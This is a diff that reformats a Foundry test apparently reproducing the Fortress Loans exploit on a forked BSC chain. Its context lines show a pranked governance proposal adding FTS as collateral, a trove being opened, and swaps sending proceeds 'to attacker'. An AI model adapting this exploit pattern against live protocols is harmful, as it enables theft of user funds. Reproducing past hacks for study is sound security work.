@@ -47,21 +47,27 @@ address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
 interface IGovernorAlpha {
     function propose(
         address[] memory targets,
-        uint[] memory values,
+        uint256[] memory values,
         string[] memory signatures,
         bytes[] memory calldatas,
         string memory description
-    ) external returns (uint);
+    ) external returns (uint256);
 
     function castVote(uint256 proposalId, bool support) external;
 
-    function queue(uint256 proposalId) external;
+    function queue(
+        uint256 proposalId
+    ) external;
 
-    function execute(uint256 proposalId) external payable;
+    function execute(
+        uint256 proposalId
+    ) external payable;
 
-    function state(uint256 proposalId) external view;
+    function state(
+        uint256 proposalId
+    ) external view;
 
-    function proposalThreshold() external view returns (uint);
+    function proposalThreshold() external view returns (uint256);
 }
 
 interface IChain {
@@ -79,29 +85,41 @@ interface IChain {
 interface FToken {}
 
 interface IFortressPriceOracle {
-    function getUnderlyingPrice(FToken fToken) external view returns (uint256);
+    function getUnderlyingPrice(
+        FToken fToken
+    ) external view returns (uint256);
 }
 
 interface IFTS {
     function approve(address spender, uint256 rawAmount) external returns (bool);
 
-    function balanceOf(address account) external view returns (uint256);
+    function balanceOf(
+        address account
+    ) external view returns (uint256);
 
-    function delegate(address delegatee) external;
+    function delegate(
+        address delegatee
+    ) external;
 
-    function getPriorVotes(address account, uint blockNumber) external view returns (uint96);
+    function getPriorVotes(address account, uint256 blockNumber) external view returns (uint96);
 }
 
 interface IfFTS {
-    function mint(uint256 mintAmount) external returns (uint256);
+    function mint(
+        uint256 mintAmount
+    ) external returns (uint256);
 
-    function balanceOf(address owner) external view returns (uint256);
+    function balanceOf(
+        address owner
+    ) external view returns (uint256);
 }
 
 interface IFBep20Delegator {
     function getCash() external view returns (uint256);
 
-    function borrow(uint256 borrowAmount) external returns (uint256);
+    function borrow(
+        uint256 borrowAmount
+    ) external returns (uint256);
 
     function underlying() external returns (address);
 }
@@ -219,12 +237,7 @@ contract Attack is Test {
 
         IERC20(MAHA).approve(BorrowerOperations, type(uint256).max);
         IBorrowerOperations(BorrowerOperations).openTrove(
-            1e18,
-            1e27,
-            IERC20(MAHA).balanceOf(address(this)),
-            address(0),
-            address(0),
-            address(0)
+            1e18, 1e27, IERC20(MAHA).balanceOf(address(this)), address(0), address(0), address(0)
         );
 
         IERC20(ARTH).approve(ARTHUSD, type(uint256).max);
@@ -284,11 +297,7 @@ contract Attack is Test {
             mulitHop[2] = USDT;
             IERC20(underlyAsset).approve(PancakeRouter, type(uint256).max);
             IPancakeRouter(payable(PancakeRouter)).swapExactTokensForTokens(
-                amount,
-                0,
-                mulitHop,
-                msg.sender,
-                block.timestamp
+                amount, 0, mulitHop, msg.sender, block.timestamp
             );
         }
 
@@ -297,10 +306,7 @@ contract Attack is Test {
         singleHop[0] = WBNB;
         singleHop[1] = USDT;
         IPancakeRouter(payable(PancakeRouter)).swapExactETHForTokens{value: address(this).balance}(
-            0,
-            singleHop,
-            msg.sender,
-            block.timestamp
+            0, singleHop, msg.sender, block.timestamp
         );
         emit log_string("\t[Pass] Swap BNB->USDT, amountOut send to attacker");
 
@@ -359,7 +365,7 @@ contract Hacker is Test {
         vm.createSelectFork("bsc", 17_490_882);
 
         address[] memory _target = new address[](1);
-        uint[] memory _value = new uint[](1);
+        uint256[] memory _value = new uint256[](1);
         string[] memory _signature = new string[](1);
         bytes[] memory _calldata = new bytes[](1);
 
@@ -370,11 +376,7 @@ contract Hacker is Test {
 
         vm.prank(address(PCreater));
         IGovernorAlpha(GovernorAlpha).propose(
-            _target,
-            _value,
-            _signature,
-            _calldata,
-            "Add the FTS token as collateral."
+            _target, _value, _signature, _calldata, "Add the FTS token as collateral."
         );
         emit log_string("[Pass] Attacker created Proposal Id 11");
 
